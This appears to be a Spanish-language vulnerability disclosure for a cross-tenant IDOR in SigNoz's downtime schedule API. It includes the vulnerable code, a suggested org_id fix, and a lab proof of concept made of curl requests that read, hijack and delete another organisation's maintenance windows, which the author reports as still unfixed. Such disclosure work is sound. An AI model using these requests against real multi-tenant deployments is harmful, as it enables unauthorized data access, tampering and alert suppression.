Downtime schedules cross-tenant IDOR_

MediumCross-tenant IDORNo response
SigNozIDORBroken Access ControlMulti-tenant

Alcance: la validación se realizó dinámicamente en un laboratorio local de dos organizaciones construido desde la Community Edition de SigNoz. El hallazgo fue reportado al equipo de seguridad de SigNoz; no hubo respuesta ni se indicó una versión corregida.

Durante la revisión de SigNoz encontré un fallo de control de acceso basado en objetos (IDOR/BOLA) en los endpoints de downtime schedules, también llamados ventanas de mantenimiento.

Los endpoints que reciben un UUID no verificaban que la organización del usuario fuera propietaria del recurso. Cualquier usuario autenticado que conociera o adivinara el UUID de otra organización podía leerlo, sobrescribirlo y reasignarlo a su propia organización, o eliminarlo directamente.

La validación confirmó el comportamiento entre dos organizaciones no relacionadas, sin usuarios, tokens ni proveedor de identidad compartidos. El problema pertenece a la Community Edition y no depende de una funcionalidad restringida a Enterprise Edition.

Rutas afectadas

Las rutas estaban registradas en pkg/apiserver/signozapiserver/ruler.go:

GET    /api/v1/downtime_schedules/{id}  → ViewAccess
PUT    /api/v1/downtime_schedules/{id}  → EditAccess
DELETE /api/v1/downtime_schedules/{id}  → EditAccess

Las operaciones de listado y creación sí aplicaban scope mediante claims.OrgID. El problema estaba en las tres rutas basadas en {id}, que no repetían esa comprobación de tenant.

Handler sin aislamiento por organización

En pkg/ruler/signozruler/handler.go, el UUID se validaba únicamente por formato y después se consultaba el recurso sin incluir la organización:

id, err := valuer.NewUUID(mux.Vars(req)["id"])
schedule, err := handler.ruler.MaintenanceStore().GetPlannedMaintenanceByID(ctx, id)

La validación del formato del UUID no constituye una comprobación de autorización. El handler nunca comparaba la organización del recurso con claims.OrgID del usuario autenticado.

Store sin filtro de org_id

La capa SQL tampoco aplicaba aislamiento. En pkg/alertmanager/alertmanagerstore/sqlalertmanagerstore/maintenance.go la consulta utilizaba únicamente el ID:

func (r *maintenance) GetPlannedMaintenanceByID(
    ctx context.Context,
    id valuer.UUID,
) (*alertmanagertypes.PlannedMaintenance, error) {
    ...Where("id = ?", id.StringValue())...
}

Esto permitía recuperar cualquier fila cuyo UUID fuera conocido, independientemente de la organización que la hubiera creado.

El caso de actualización

El impacto más significativo aparecía en UpdatePlannedMaintenance. La función obtenía una fila sin scope y posteriormente escribía la organización del atacante:

existing, _ := r.GetPlannedMaintenanceByID(ctx, id)

storablePlannedMaintenance := alertmanagertypes.StorablePlannedMaintenance{
    ...
    OrgID: claims.OrgID,
    ...
}

La operación no solo sobrescribía nombre, descripción, horario y alertas vinculadas; también reasignaba org_id al tenant del editor que enviaba la petición.

Prueba de concepto local

El laboratorio contenía dos organizaciones independientes:

  • Org A: organización propietaria de la ventana de mantenimiento.
  • Org B: organización del atacante, sin relación con Org A.
  • Token A: propietario o administrador de Org A.
  • Token B: usuario editor de Org B.

1. Crear una ventana en Org A

curl -sS -X POST "$BASE_URL/api/v1/downtime_schedules" \
  -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"OrgA Maintenance",
    "description":"vdp-lab target",
    "schedule": {
      "timezone":"UTC",
      "startTime":"2026-08-05T21:11:59Z",
      "endTime":"2026-08-06T21:11:59Z"
    },
    "alertIds":["<ALERT_A_ID>"]
  }'

La API respondió HTTP 201 y devolvió un UUID sintético para la ventana:

{
  "status": "success",
  "data": {
    "id": "<ORG_A_SCHEDULE_ID>",
    "name": "OrgA Maintenance",
    "createdBy": "admin@org-a.lab",
    "updatedBy": "admin@org-a.lab",
    "status": "active",
    "kind": "fixed"
  }
}

2. Control: el listado de Org B no lo muestra

curl -sS "$BASE_URL/api/v1/downtime_schedules" \
  -H "Authorization: Bearer $TOKEN_B"

{"status":"success","data":[]}

El listado estaba correctamente limitado a Org B. Esto demostraba que el recurso no pertenecía al tenant atacante y que el problema estaba específicamente en las rutas por ID.

3. Lectura cross-tenant

curl -sS \
  "$BASE_URL/api/v1/downtime_schedules/<ORG_A_SCHEDULE_ID>" \
  -H "Authorization: Bearer $TOKEN_B"

La respuesta fue HTTP 200 y devolvió la ventana de Org A:

{
  "status": "success",
  "data": {
    "id": "<ORG_A_SCHEDULE_ID>",
    "name": "OrgA Maintenance",
    "description": "vdp-lab target",
    "schedule": {
      "timezone": "UTC",
    },
    "alertIds": ["<ALERT_A_ID>"],
    "createdBy": "admin@org-a.lab",
    "updatedBy": "admin@org-a.lab"
  }
}

El token de Org B podía leer el nombre, descripción, horario, regla de alerta vinculada y correos de los usuarios de Org A.

4. Hijack mediante PUT

curl -sS -X PUT \
  "$BASE_URL/api/v1/downtime_schedules/<ORG_A_SCHEDULE_ID>" \
  -H "Authorization: Bearer $TOKEN_B" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"PWNED-BY-ORGB",
    "description":"hijacked via IDOR",
    "schedule": {
      "timezone":"UTC",
      "startTime":"2026-08-05T21:11:59Z",
      "endTime":"2026-08-06T21:11:59Z"
    },
    "alertIds":[]
  }'

La API respondió HTTP 204 No Content. Al volver a consultar los listados:

Org A → data: []
Org B → data: [{
  "id": "<ORG_A_SCHEDULE_ID>",
  "name": "PWNED-BY-ORGB",
  "alertIds": [],
  "createdBy": "admin@org-a.lab",
  "updatedBy": "admin@org-b.lab"
}]

La ventana desapareció del listado de Org A y apareció en Org B, con org_id reasignado y la alerta desvinculada.

5. Borrado cross-tenant

Creé una segunda ventana en Org A y la eliminé con el token editor de Org B:

curl -sS -X DELETE \
  "$BASE_URL/api/v1/downtime_schedules/<SECOND_ORG_A_SCHEDULE_ID>" \
  -H "Authorization: Bearer $TOKEN_B"

HTTP/1.1 204 No Content

Después del borrado, Org A recibió HTTP 404 al consultar un recurso que había creado originalmente:

{
  "status": "error",
  "error": {
    "type": "not-found",
    "code": "not_found",
    "message": "planned maintenance with ID does not exist"
  }
}

Impacto

Lectura

Cualquier usuario autenticado con capacidad de obtener un UUID podía leer una ventana de mantenimiento de otra organización. Un rol Viewer podía acceder a nombre, descripción, recurrencia, zona horaria, IDs de alertas y los campos createdBy/updatedBy, incluyendo correos reales de usuarios del tenant víctima.

Modificación y hijack

Un usuario Editor podía sobrescribir la ventana, cambiar su horario, eliminar sus alertas vinculadas y reasignarla a su propia organización.

Esta operación podía convertirse en un vector de supresión de alertas: una ventana secuestrada podía apuntar a una regla de alerta de la víctima y silenciarla durante un intervalo elegido, ocultando potencialmente un incidente activo en el producto de monitorización.

Borrado

Un usuario Editor podía eliminar por completo una ventana de mantenimiento perteneciente a otra organización, afectando sus operaciones programadas y su configuración de alertas.

Corrección sugerida

El valor de claims.OrgID debe propagarse a GetPlannedMaintenanceByID, UpdatePlannedMaintenance y DeletePlannedMaintenance. Cada consulta debe incluir el filtro de tenant:

Where("id = ?", id.StringValue()).
Where("org_id = ?", orgID)

La implementación debe seguir el patrón ya utilizado correctamente por ListPlannedMaintenance y CreatePlannedMaintenance. También conviene añadir pruebas de regresión con dos organizaciones, verificando lectura, modificación y borrado con UUIDs de un tenant distinto.

Entorno

La revisión se realizó contra el repositorio open source de SigNoz en la rama principal. La reproducción utilizó un build local con ClickHouse y Zookeeper mediante Docker Compose, dos organizaciones registradas de forma independiente y sin usuarios, tokens o proveedor de identidad compartidos.

Estado

El hallazgo fue reportado al equipo de seguridad de SigNoz. No hubo respuesta ni se indicó una versión corregida. Esta investigación queda publicada con ese estado.
